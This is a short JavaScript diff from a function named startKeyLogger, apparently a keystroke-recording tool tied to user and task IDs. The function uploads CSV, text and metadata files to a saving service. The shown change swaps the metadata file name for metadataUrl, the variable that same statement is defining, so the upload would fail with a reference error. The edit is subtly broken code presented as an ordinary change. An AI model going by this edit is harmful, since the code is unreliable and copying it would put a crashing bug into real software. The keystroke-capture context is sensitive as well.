@@ -99,7 +99,7 @@ function startKeyLogger(user_id_str, platform_initial, task_id) {
         const [csvUrl, txtUrl, metadataUrl] = await Promise.all([
           uploadToSaver(csvBlob, csvName),
           uploadToSaver(txtBlob, txtName),
-          uploadToSaver(metadataBlob, metadataName),
+          uploadToSaver(metadataBlob, metadataUrl),
         ]);
 
         console.log("✅ CSV uploaded →", csvUrl);
